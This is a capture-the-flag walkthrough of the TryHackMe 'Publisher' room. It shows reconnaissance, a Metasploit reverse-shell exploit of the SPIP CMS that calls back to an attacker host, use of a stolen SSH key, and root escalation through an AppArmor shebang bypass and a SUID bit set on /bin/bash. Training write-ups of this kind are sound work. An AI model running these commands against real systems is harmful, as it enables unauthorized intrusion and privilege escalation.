# Writeup for Room "Publisher"

This is the writeup for the box Publisher

## 🔍 Enumeration Phase

## 1. WebSite
- The website is running on Apache.
- No useful information was found in `robots.txt`.

    ![WebSite](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/00.png)

    ![robots.txt](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/01.png)

## 2. Fuzzing
-  **Dirbuster / Gobuster** was used to find directories and files, the following images show the results:

    ![Fuzzing](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/02.png)

> [!NOTE]
> There is a list of images that might contain hidden information (steganography).

## 📡 3. Nmap Scan
- The following information was found:
  - The port 22 is open. **SSH**
  - The port 80 is open. **HTTP (Apache)**

    ![Nmap Scan](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/03.png)

## 4. More Fuzzing 
- I also used the command ```dirsearch -u ip-machine``` to find more directories and files.

    ![dirsearch](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/04.png)

## 🌐🖥️ 5. WebSite - Investigation
- It turns out that SPIP is a free and open-source CMS.

    ![spip](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/05.png)

- We have identified a directory called ```/spip```:

    ![spip-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/06.png)

- And there's a login form located at ```/spip/spip.php```.

    ![spip-3](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/07.png)

## 🌐🖥️ 6. WebSite - Reverse Shell

- After several attempts, I managed to exploit SPIP using msfconsole with the following configuration:

```bash
set RHOSTS <TARGET_IP>
set TARGETURI /spip/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST <YOUR_ATTACKER_IP> (in my case, my VPN IP)
```

![msfconsole](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/08.png)

- Then I navigated to ```/home/think``` and found the first flag.

    ![first-flag](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/09.png)

## 🌐🖥️ 7. Enumeration exploits - LinPEAS

- I decided to upload linpeas.sh, gave it execute permissions, and used it to check for possible privilege escalation vectors.

    ![linpeas](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/10.png)

## 🔑 8. SSH Access

- After reviewing the output from LinPEAS, I found an SSH private key.

    ![ssh-key](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/11.png)

- I downloaded the key, but when trying to use it, I got a permission denied error. I had to run:

    ![ssh-key-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/12.png)

- ```chmod 600 <key_file>``` to be able to connect successfully.

    ![ssh-key-3](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/13.png)

    ![ssh-key-4](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/14.png)

## 🐚💻🚀 9.Privilege Escalation

- The room's hint mentioned AppArmor. After searching around and experimenting, I ran the following command ```ls /etc/apparmor.d/ -la``` to gather more information on the active profiles:

    ![apparmor](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/15.png)

- There was a file named ```usr.sbin.ash```, which looked interesting, and I had permission to use a script called ```run_container```.

    ![run_container](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/16.png)

- The ```sbin.ash``` AppArmor profile contains rules that deny access to certain directories.

    ![apparmor-2](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/17.png)

- While researching online, I found a trick to bypass AppArmor using a container and chmod, as described here: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/apparmor.html#apparmor-shebang-bypass

- I tried running:

```bash
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /tmp/test.pl
chmod +x /tmp/test.pl
/tmp/test.pl
```
- But it returned a "Permission denied" error.

    ![permission-denied](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/18.png)

- Then I tried the following:

```bash
echo -e '#!/usr/bin/perl\nexec "/bin/sh"' > /dev/shm/test.pl
chmod +x /dev/shm/test.pl
/dev/shm/test.pl
```

- ```/dev/shm``` is a temporary shared memory location with more relaxed permissions.
- A simple Perl script is created and executed to launch ```/bin/sh```.
- Result: Shell access was granted, but not yet with root privileges.

    ![shell-access](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/19.png)

- Then I executed the following ```echo '#!/bin/bash\nchmod +s /bin/bash' > /opt/run_container.sh```

- This script does the following: ```chmod +s /bin/bash``` → Sets the SUID bit on /bin/bash, allowing it to inherit the owner’s privileges (root) when executed.

- Now, if we run ```/bin/bash -p``` and execute ```cat /root/root.txt``` or ```id```, we can see the final flag and confirm we have root privileges.

    ![root-privileges](https://github.com/MCornejoDev/TryHackMe/blob/main/rooms/publisher/screenshots/20.png)
